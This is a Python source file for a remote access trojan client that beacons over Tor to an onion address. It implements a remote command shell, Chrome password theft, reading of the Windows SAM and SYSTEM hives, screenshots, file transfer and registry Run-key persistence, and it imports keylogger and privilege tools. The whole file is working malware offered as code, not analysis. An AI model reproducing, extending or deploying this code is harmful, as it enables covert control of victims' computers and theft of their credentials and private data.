# import cv2
import json
import os
import socket
import subprocess
import sys
import threading
from sys import platform
from shutil import copyfile
import requests
from mss import mss
# import cv2
#importing tor network
from tor_network import ClientSocket, Tor
import time

# Local tools to the application
from tools import keylogger,privilege,chrome,peripherals
#constraints
ENCODING = 'utf-8'


def reliable_send(data):
    try:
        json_data = json.dumps(data)
        length = len(json_data)
        length_header = f"{length:<10}".encode()  # Fixed length header
        s.send(length_header)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")
        raise

def reliable_recv():
    try:
        # First receive the length header
        length_header = s.recv(10).decode().strip()
        if not length_header:
            return None
        
        # Convert length header to int
        length = int(length_header)
        
        # Receive the actual data
        chunks = []
        bytes_received = 0
        while bytes_received < length:
            chunk = s.recv(min(length - bytes_received, 4096))
            if not chunk:
                return None
            chunks.append(chunk)
            bytes_received += len(chunk)
        
        data = b''.join(chunks).decode()
        
        try:
            return json.loads(data)
        except json.JSONDecodeError:
            return data.strip()
            
    except Exception as e:
        print(f"Error receiving data: {e}")
        raise


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(2)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
    f.close()


def download_url(url):
    get_response = requests.get(url)
    file_name = url.split('/')[-1]
    with open(file_name, 'wb') as out_file:
        out_file.write(get_response.content)


def screenshot():
    if platform == "win32" or platform == "darwin":
        with mss() as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')
    elif platform == "linux" or platform == "linux2":
        with mss(display=":0.0") as screen:
            filename = screen.shot()
            os.rename(filename, '.screen.png')

# TODO: screenshot other monitors


# TODO: SAM - this code is untested
def get_sam_dump():
    if not is_admin():
        return ("You must run this function as an Administrator.",0,0)

    SAM = r'C:\Windows\System32\config\SAM'
    SYSTEM = r'C:\Windows\System32\config\SYSTEM'
    SECURITY = r'C:\Windows\System32\config\SECURITY'
    try:
        sam_file = open(SAM, 'rb')
        system_file = open(SYSTEM, 'rb')
        security_file = open(SECURITY, 'rb')
        
        sam_data = sam_file.read()
        system_data = system_file.read()
        security_data = security_file.read()
        sam_file.close()
        system_file.close()
        security_file.close()
        
        return (sam_data, system_data, security_data)
    except PermissionError:
        return ("Insufficient permissions to access SAM, SYSTEM, or SECURITY files.",0,0)
    except FileNotFoundError:
        return ("SAM, SYSTEM, or SECURITY file not found. Please check the file paths.",0,0)
    except Exception as e:
        return (f"An unexpected error occurred: {str(e)}",0,0)


#USING WEBCAM FEATURE ADDS 40MB TO THE EXECUTABLE AS CV2 IS A LARGE LIBRARY
# def capture_webcam():
#     webcam = cv2.VideoCapture(0)
#     webcam.set(cv2.CAP_PROP_EXPOSURE, 40)

#     # Check if the webcam is available
#     if not webcam.isOpened():
#         print("No webcam available")
#         return
    
#     ret, frame = webcam.read()

#     # Check if the webcam was able to capture a frame
#     if not ret:
#         print("Failed to read frame from webcam")
#         return

#     webcam.release()

#     # Save the frame to a file
#     if platform == "win32" or platform == "darwin" or platform == "linux" or platform == "linux2":
#         is_success, im_buf_arr = cv2.imencode(".webcam.png", frame)
#         if is_success:
#             with open('.webcam.png', 'wb') as f:
#                 f.write(im_buf_arr.tobytes())
#         else:
#             print("Failed to save webcam image")


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            copyfile(sys.executable, file_location)
            subprocess.call(
                'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"',
                shell=True)
            reliable_send('[+] Created Persistence With Reg Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence Already Exists')
    except:
        reliable_send('[-] Error Creating Persistence With The Target Machine')


def is_admin():
    if platform == 'win32':
        try:
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
        except:
            return False
        else:
            return True
    elif platform == "linux" or platform == "linux2" or platform == "darwin":
        pass
        # TODO implmenet checking if these platforms have root/admin access
    return False

def chrome_passwords():
    try:
        passwords = chrome.chrome_pass()
        fn = open(passwords,"r")
        reliable_send(fn.read())
        fn.close()
    except Exception as e:
        reliable_send('[-] Error getting passwords from chrome',e)

#not yet tested
def block_peripherals():
    try:
        res = peripherals.block()
        reliable_send(res)
    except Exception as e:
        print(e)

def unblock_peripherals():
    try:
        res = peripherals.unblock()
        reliable_send(res)
    except Exception as e:
        print(e)

def get_system_info():
    try:
        info = {
            'os': platform,
            'hostname': socket.gethostname(),
            'username': os.getlogin(),
            'is_admin': is_admin()
        }
        return json.dumps(info)  # Convert to JSON string
    except Exception as e:
        return json.dumps({
            'os': 'Unknown',
            'hostname': 'Unknown',
            'username': 'Unknown',
            'is_admin': False,
            'error': str(e)
        })

def shell():
    while True:
        try:
            command = reliable_recv()
            if not command:
                break
                
            if command == 'quit':
                break
            elif command == 'sysinfo':
                info = {
                    'os': platform,
                    'hostname': socket.gethostname(),
                    'username': os.getlogin(),
                    'is_admin': is_admin()
                }
                reliable_send(info)
            elif command.startswith('cd '):
                try:
                    os.chdir(command[3:])
                    reliable_send({'success': True, 'cwd': os.getcwd()})
                except Exception as e:
                    reliable_send({'error': str(e)})
            else:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                reliable_send(result.decode())
                
        except Exception as e:
            reliable_send({'error': str(e)})
            continue

def connect():
    while True:
        try:
            s.connect((HOST, PORT))
            shell()
            break
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(5)  # Wait before retrying
            continue

tor = Tor()
onion, port = tor.read_address_from_binary()
print('onion: ' + onion + '\nport: ' + str(port))

clientsock = ClientSocket(onion,port)
connect()